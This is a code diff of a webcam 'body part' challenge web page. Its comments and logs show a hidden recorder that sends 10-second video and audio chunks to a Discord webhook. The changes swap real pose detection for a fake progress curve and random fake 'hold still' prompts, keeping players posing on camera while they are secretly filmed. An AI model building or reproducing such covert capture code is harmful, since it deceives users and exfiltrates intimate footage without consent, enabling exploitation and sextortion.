-        // ============================================================
-        function updateProgress(value, stateType) {
-            const pct = Math.round(value);
-            progressFill.style.width = pct + '%';
-            progressPct.textContent = pct + '%';
-
-            if (stateType === 'scanning') {
-                progressFill.className = 'progress-fill scanning';
-                progressPct.className = 'pct';
-                progressStatus.textContent = 'scanning';
-            } else if (stateType === 'detected') {
-                progressFill.className = 'progress-fill detected';
-                progressPct.className = 'pct detected';
-                progressStatus.textContent = '✅ detected!';
-            } else if (stateType === 'done') {
-                progressFill.className = 'progress-fill done';
-                progressPct.className = 'pct detected';
-                progressStatus.textContent = '✅ complete!';
-            } else {
-                progressFill.className = 'progress-fill';
-                progressPct.className = 'pct';
-                progressStatus.textContent = '—';
-            }
-        }
-
-        // ============================================================
-        //  ─── GAME LOGIC ───
+        //  GAME LOGIC
         // ============================================================
         function startGame() {
             if (state.gameStarted || state.gameDone) return;
@@ -1437,11 +1106,8 @@
 
             statusMsg.textContent = '';
             statusMsg.className = 'status-msg';
-
-            // Hide progress bar initially
             progressContainer.classList.remove('show');
 
-            // Begin first part
             setTimeout(() => beginPart(0), 400);
         }
 
@@ -1455,17 +1121,23 @@
             state.currentPartIndex = index;
             state.isScanning = false;
             state.partDetected = false;
-            state.detectionFrames = 0;
             state.progressValue = 0;
             state.scanTimer = SCAN_TIME;
-            state.isPaused = false;
+            state.elapsedTime = 0;
+            state.holdStillActive = false;
+            state.holdStillTimer = 0;
+
+            // Generate seeded progress curve for this part
+            state.partSeed = index * 777 + Date.now() % 1000;
+            state.progressCurve = generateProgressCurve(part.difficulty, state.partSeed);
+            state.curveIndex = 0;
 
             timerDisplay.textContent = SCAN_TIME;
             timerBox.className = 'timer-box';
             progressContainer.classList.remove('show');
             updateProgress(0, 'idle');
+            holdStillMsg.classList.remove('show');
 
-            // Show part name
             challengeTarget.textContent = part.emoji + ' ' + part.label;
             challengeBadge.innerHTML =
                 `<span class="emoji">🎯</span> Show <span class="highlight">${part.emoji} ${part.label}</span>`;
@@ -1473,7 +1145,6 @@
             statusBadge.textContent = `⏳ get ready …`;
             statusBadge.className = 'status-badge waiting';
 
-            // Show points popup
             const pts = part.points;
             pointsPopup.textContent = `+${pts} pts`;
             pointsPopup.className = 'points-popup';
@@ -1486,12 +1157,10 @@
             }
             pointsPopup.classList.add('show');
 
-            // Hide after 1.5s
             setTimeout(() => {
                 pointsPopup.classList.remove('show');
             }, 1500);
 
-            // Start countdown after 1.8s
             setTimeout(() => {
                 startCountdown(index);
             }, 1800);
@@ -1522,10 +1191,10 @@
             const part = BODY_PARTS[index];
             state.isScanning = true;
             state.partDetected = false;
-            state.detectionFrames = 0;
             state.progressValue = 0;
             state.scanTimer = SCAN_TIME;
-            state.movementScore = 0;
+            state.elapsedTime = 0;
+            state.holdStillActive = false;
 
             timerDisplay.textContent = SCAN_TIME;
             timerBox.className = 'timer-box';
@@ -1539,21 +1208,52 @@
             if (state.scanInterval) clearInterval(state.scanInterval);
             state.scanInterval = setInterval(() => {
                 state.scanTimer--;
+                state.elapsedTime = SCAN_TIME - state.scanTimer;
                 timerDisplay.textContent = state.scanTimer;
+
                 if (state.scanTimer <= 5) {
                     timerBox.className = 'timer-box danger';
                 } else if (state.scanTimer <= 10) {
                     timerBox.className = 'timer-box warning';
                 }
-                if (state.scanTimer <= 0) {
+
+                // Update progress from curve
+                if (!state.partDetected && state.isScanning) {
+                    const progress = getProgressAtTime(state.progressCurve, state.elapsedTime);
+                    state.progressValue = Math.min(progress, 100);
+                    updateProgress(state.progressValue, 'scanning');
+
+                    // Random "hold still" triggers (fake)
+                    if (!state.holdStillActive && Math.random() < 0.03 && state.progressValue > 15 && state.progressValue <
+                        85) {
+                        state.holdStillActive = true;
+                        state.holdStillTimer = 1.5 + Math.random() * 2.5;
+                        holdStillMsg.classList.add('show');
+                        statusBadge.textContent = '✋ hold still …';
+                        statusBadge.className = 'status-badge hold';
+                    }
+
+                    if (state.holdStillActive) {
+                        state.holdStillTimer -= 0.1;
+                        if (state.holdStillTimer <= 0) {
+                            state.holdStillActive = false;
+                            holdStillMsg.classList.remove('show');
+                            statusBadge.textContent = `🔍 scanning … ${Math.round(state.progressValue)}%`;
+                            statusBadge.className = 'status-badge scanning';
+                        }
+                    }
+
+                    // Check if we reached 100%
+                    if (state.progressValue >= 99.5) {
+                        onScanSuccess(index);
+                    }
+                }
+
+                if (state.scanTimer <= 0 && !state.partDetected) {
                     clearInterval(state.scanInterval);
                     onScanFail(index);
                 }
-            }, 1000);
-
-            // Reset detection frames
-            state.detectionFrames = 0;
-            prevLandmarks = null;
+            }, 100);
         }
 
         function onScanSuccess(index) {
@@ -1566,21 +1266,18 @@
             state.totalPoints += part.points;
             scoreDisplay.textContent = state.totalPoints;
 
-            // Update progress to done
             updateProgress(100, 'done');
-
             statusBadge.textContent = `✅ ${part.emoji} +${part.points} pts!`;
             statusBadge.className = 'status-badge success';
+            holdStillMsg.classList.remove('show');
 
-            // Flash effect
+            // Flash
             const flash = document.createElement('div');
             flash.style.cssText =
-                'position:absolute;inset:0;background:#00f5c0;z-index:6;pointer-events:none;opacity:0.25;transition:opacity 0.5s ease;border-radius:22px;';
+                'position:absolute;inset:0;background:#00f5c0;z-index:6;pointer-events:none;opacity:0.2;transition:opacity 0.5s ease;border-radius:22px;';
             document.getElementById('camWrapper').appendChild(flash);
-            setTimeout(() => {
-                flash.style.opacity = '0';
-                setTimeout(() => flash.remove(), 500);
-            }, 100);
+            setTimeout(() => { flash.style.opacity = '0';
+                setTimeout(() => flash.remove(), 500); }, 100);
 
             state.partResults.push({
                 part: part.id,
@@ -1590,12 +1287,8 @@
                 time: SCAN_TIME - state.scanTimer,
             });
 
-            // Hide progress bar after delay
-            setTimeout(() => {
-                progressContainer.classList.remove('show');
-            }, 800);
+            setTimeout(() => { progressContainer.classList.remove('show'); }, 600);
 
-            // Move to next part after delay
             setTimeout(() => {
                 const next = index + 1;
                 if (next < BODY_PARTS.length) {
@@ -1603,7 +1296,7 @@
                 } else {
                     endGame(true);
                 }
-            }, 1500);
+            }, 1400);
         }
 
         function onScanFail(index) {
@@ -1614,8 +1307,8 @@
             const part = BODY_PARTS[index];
             statusBadge.textContent = `❌ time out — ${part.label}`;
             statusBadge.className = 'status-badge fail';
-
             progressContainer.classList.remove('show');
+            holdStillMsg.classList.remove('show');
 
             state.partResults.push({
                 part: part.id,
@@ -1625,7 +1318,6 @@
                 time: 0,
             });
 
-            // Move to next part after delay
             setTimeout(() => {
                 const next = index + 1;
                 if (next < BODY_PARTS.length) {
@@ -1641,10 +1333,9 @@
             state.gameDone = true;
             state.gameStarted = false;
             state.isScanning = false;
-
             clearInterval(state.scanInterval);
-            clearInterval(state.countdownInterval);
             progressContainer.classList.remove('show');
+            holdStillMsg.classList.remove('show');
 
             startBtn.disabled = false;
             resetBtn.disabled = false;
@@ -1660,9 +1351,28 @@
             statusBadge.className = 'status-badge done';
         }
 
+        function updateProgress(value, stateType) {
+            const pct = Math.round(value);
+            progressFill.style.width = pct + '%';
+            progressPct.textContent = pct + '%';
+
+            if (stateType === 'scanning') {
+                progressFill.className = 'progress-fill scanning';
+                progressPct.className = 'pct';
+                progressStatus.textContent = 'scanning';
+            } else if (stateType === 'done') {
+                progressFill.className = 'progress-fill done';
+                progressPct.className = 'pct detected';
+                progressStatus.textContent = '✅ complete!';
+            } else {
+                progressFill.className = 'progress-fill';
+                progressPct.className = 'pct';
+                progressStatus.textContent = '—';
+            }
+        }
+
         function resetGame() {
             clearInterval(state.scanInterval);
-            clearInterval(state.countdownInterval);
             state.gameStarted = false;
             state.gameDone = false;
             state.isScanning = false;
@@ -1695,7 +1405,7 @@
         }
 
         // ============================================================
-        //  ─── AI MODEL LOADING ───
+        //  LOADING
         // ============================================================
         function loadModelWithProgress() {
             return new Promise((resolve) => {
@@ -1711,7 +1421,7 @@
                         startBtn.disabled = false;
                         startBtnText.textContent = '🚀 Start';
                         startSpinner.classList.add('hidden');
-                        statusMsg.textContent = '✅ Model ready! Click Start to play.';
+                        statusMsg.textContent = '✅ Ready! Click Start.';
                         statusMsg.className = 'status-msg success';
                         statusBadge.textContent = '✅ Ready!';
                         statusBadge.className = 'status-badge waiting';
@@ -1723,11 +1433,11 @@
         }
 
         // ============================================================
-        //  ─── EVENT BINDING ───
+        //  EVENTS
         // ============================================================
         startBtn.addEventListener('click', () => {
             if (!state.modelLoaded) {
-                statusMsg.textContent = '⏳ Model not ready — please wait.';
+                statusMsg.textContent = '⏳ Model not ready.';
                 statusMsg.className = 'status-msg error';
                 return;
             }
@@ -1740,16 +1450,13 @@
         });
 
         resetBtn.addEventListener('click', resetGame);
-        restartBtn.addEventListener('click', () => {
-            resetGame();
-            setTimeout(startGame, 500);
-        });
+        restartBtn.addEventListener('click', () => { resetGame();
+            setTimeout(startGame, 500); });
 
         // ============================================================
-        //  ─── BOOT ───
+        //  BOOT
         // ============================================================
         async function boot() {
-            // Load model with progress
             loadingContainer.style.display = 'block';
             statusMsg.textContent = '⏳ Loading AI model…';
             statusMsg.className = 'status-msg loading';
@@ -1758,28 +1465,28 @@
 
             await loadModelWithProgress();
 
-            // Init display camera
             const camOK = await initDisplayCamera();
             if (!camOK) {
-                statusMsg.textContent = '❌ Camera required. Please allow access and reload.';
+                statusMsg.textContent = '❌ Camera required. Please allow access.';
                 statusMsg.className = 'status-msg error';
                 return;
             }
 
-            // Init recorder (hidden)
             await initRecorder();
-
-            // Init pose
-            initPose();
-
             resetGame();
+
             console.log('🚫 Faceless Challenge loaded');
-            console.log('📡 webhook:', DISCORD_WEBHOOK_URL);
-            console.log('🦴 body parts:', BODY_PARTS.length);
-            console.log('🎥 Recorder: 10s chunks to Discord (video+audio)');
+            console.log('🦴 Body parts:', BODY_PARTS.length);
+            console.log('🎥 Recorder: 10s chunks (hidden)');
         }
 
         boot();
+
+        // ─── BODY PARTS LIST (for display) ──────────────────────────
+        console.log('📋 BODY PARTS & POINTS:');
+        BODY_PARTS.forEach((p, i) => {
+            console.log(`  ${i+1}. ${p.emoji} ${p.label} — ${p.points} pts (diff: ${p.difficulty.toFixed(2)})`);
+        });
     </script>
 </body>
 </html>
